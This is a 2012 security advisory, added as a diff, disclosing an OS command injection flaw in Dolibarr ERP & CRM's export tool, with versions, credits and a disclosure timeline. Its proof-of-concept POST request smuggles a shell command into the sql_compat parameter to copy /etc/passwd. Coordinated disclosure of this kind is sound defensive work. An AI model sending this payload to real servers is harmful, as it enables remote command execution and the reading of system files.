@@ -1,0 +1,50 @@
+Dolibarr ERP & CRM OS Command Injection
+===================================
+
+1. Advisory Information
+Date published: 2012-4-6
+Vendors contacted: Dolibarr
+Release mode: Coordinated release
+
+2. Vulnerability Information
+Class: Injection
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+
+3. Software Description
+Dolibarr ERP & CRM is a modern web software to manage your activity (contacts, invoices, orders, stocks, agenda, etc...). It's an opensource and free software designed for small companies, foundations and freelances.
+
+4. Vulnerability Description
+Injection flaws, such as SQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker?s hostile data can trick the interpreter into executing unintended commands or accessing unauthorized data.
+
+5. Vulnerable packages
+Dolibarr <= 3.1.1
+Dolibarr <= 3.2.0
+
+6. Non-vulnerable packages
+Vendor said that the vulnerability was fixed in Development version of 3.2.X branch. However, the fix for 3.1.X branch will be published by June. Vendor accepted the public disclosure of this vulnerability.
+
+7. Credits
+This vulnerability was discovered by Nahuel Grisolia 
+( nahuel @ cintainfinita.com.ar )
+
+8. Technical Description
+8.1. OS Command Injection ? PoC Example
+CVSSv2 Score: 8.5 (AV:N/AC:M/Au:S/C:C/I:C/A:C)
+Dolibarr is prone to remote command execution vulnerability because the software fails to adequately sanitize user-supplied input.
+A command injection attack can be executed if specially crafted parameters are sent. 
+Successful attacks can compromise the affected Web Server and its software.
+The following proof of concept is given:
+POST /dolibarr/admin/tools/export.php HTTP/1.1
+[?]
+Cookie: DOLSESSID_[?]=[?]
+
+token=[...]&export_type=server&what=mysql&mysqldump=%2Fusr%2Fbin%2Fmysqldump&use_transaction=yes&disable_fk=yes&sql_compat=;cat
+/etc/passwd > /tmp/cintainfinitapasswd;&sql_structure=structure&drop=1&sql_data=data&showcolumns=yes&extended_ins=yes&delayed=yes&sql_ignore=yes&hexforbinary=yes&filename_template=mysqldump_dolibarrdebian_3.1.1_201203231716.sql&compression=none
+
+
+9. Report Timeline
+* 2012-03-26 / Vendor notification
+* 2012-03-27 / Vulnerability details sent to Vendor
+* 2012-03-27 / Vendor fix ? See 6. Non-vulnerable packages
+* 2012-04-06 / Public Disclosure ? PoC attached
